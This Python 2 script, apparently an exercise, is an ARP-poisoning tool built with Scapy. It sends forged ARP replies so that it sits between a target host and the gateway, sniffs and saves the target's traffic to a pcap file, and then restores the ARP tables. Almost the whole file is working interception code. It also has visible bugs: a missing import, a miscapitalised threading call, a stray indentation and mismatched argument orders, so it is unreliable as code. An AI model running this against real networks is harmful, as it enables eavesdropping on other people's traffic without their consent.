from scapy.all import conf,srp,Ether,ARP,send,sniff,wrpcap
#import pcap
import time
import os
import sys
import threading
import signal

# define ip addressess, packet count, interface name

interface = "eth0"
gateway_ip = "192.168.0.1"
target_ip = "192.168.0.100"
packet_count = 1000
poisoning = True

#TODO define restore_target
def restore_target(gateway_ip, target_ip, gateway_mac, target_mac):
    print "**Restoring target now...**"

    # op =2 issues ARP reply, psrc is the source gateway ip, pdst is the source host. hwdst ="ff:ff:..." identifies
    # packets addressesd to every computer on a lan segment. ether frames containing IP broadcast packages also
    # typically sent to this address. hwsrc identifies the physical address of the gateway
    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac), count=5)
    send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target_mac), count=5)

    print " Systems restored - exiting..."

#TODO define get_mac
#Get MAC from IP. This will broadcast ARP reqs related to ip_address. This will then receive an ARP reply w/MAC address.
def get_mac(ip_address):
    # send/receive packages on ethernet w/ dest "ff:ff:..."
    resp, unans = sr(ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=ip_address), retry=2, timeout=10)
    for s,r in resp:
        return r[ARP].hwsrc
    return None
#TODO define poison_target
# This will allow us to put our machine in the middle by continuously broadcasting false ARP replies. We will also
# use our interface MAC for the hwsrc for ARP replies
def poison_target(gateway_ip,target_ip,gateway_mac,target_mac):
    global poisoning

    poison_target = ARP()
    poison_target.op = 2
    poison_target.psrc = gateway_ip
    poison_target.pdst = target_ip
    poison_target.hwdst = target_mac

    poison_gateway = ARP()
    poison_gateway.op = 2
    poison_gateway.psrc = target_ip
    poison_gateway.pdst = gateway_ip
    poison_gateway.hwdst = gateway_mac

    print "**ARP poisoning underway...ETX to stop"

    while poisoning:
        send(poison_target)
        send(poison_gateway)

        time.sleep(2)
    print "**ARP poisoning has finished..."
    return

#TODO define body

# define interface
conf.iface = interface

# not verbose
conf.verb = 0

print "**Initializing interface...**"
gateway_mac = get_mac(gateway_ip)

# Check for valid gateway_mac
if gateway_mac is None:
    print "**Failed to retrieve gateway MAC - exiting..."
    sys.exit(0)
else:
    print "** Gateway IP = %s , Gateway MAC = %s" % (gateway_ip, gateway_mac)
 target_mac = get_mac(target_ip)

# Check for valid target_mac
if target_mac is None:
    print "**Failed to retrieve target MAC - exiting..."
else:
    print "** Target IP = %s, Target MAC = %s" % (target_mac, target_ip)

# Create poisoning thread
poison_thread = threading.thread(target = poison_target, args = (gateway_ip,gateway_mac,target_ip,target_mac))
poison_thread.start()


try:
    print "** Sniffing for %d packets**" % packet_count

    # this filter allows us to capture only the packets sent to target_ip
    bpf_filter = "ip host %s" %target_ip
    packets = sniff(count = packet_count, filter = bpf_filter, iface = interface)

    wrpcap("arper_mine.pcap", packets)
    restore_target(gateway_ip,gateway_mac,target_ip,target_mac)
except KeyboardInterrupt:
    restore_target(gateway_ip,gateway_mac,target_ip,target_mac)
    sys.exit(0)
